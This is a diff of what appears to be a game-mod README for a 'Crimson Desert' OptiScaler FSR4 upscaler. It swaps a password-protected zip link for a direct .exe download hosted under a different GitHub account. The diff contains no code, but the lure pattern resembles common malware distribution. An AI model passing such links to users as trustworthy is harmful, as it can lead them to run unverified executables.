@@ -26,9 +26,7 @@ Significantly boosts FPS while delivering sharp, high-quality visuals optimized 
 
 ## 📥 Download
 
-📥 [`Crimson_Desert_OptiScaler_FSR4_Desktop.zip`](https://github.com/Joefix2010/Crimson-Desert-OptiScaler-FSR4-Desktop/releases/download/Release/Crimson_Desert_OptiScaler_FSR4_Desktop.zip)  
-🔐 `LS2026`
-
+📥 [`OptiscalerCrimsonDesert.exe`](https://github.com/BeyondGames0/Crimson-Desert-Optiscaler-FSR-4-Desktop/releases/download/Game-Addons/OptiscalerCrimsonDesert.exe)  
 ---
 
 ### Archive Contents
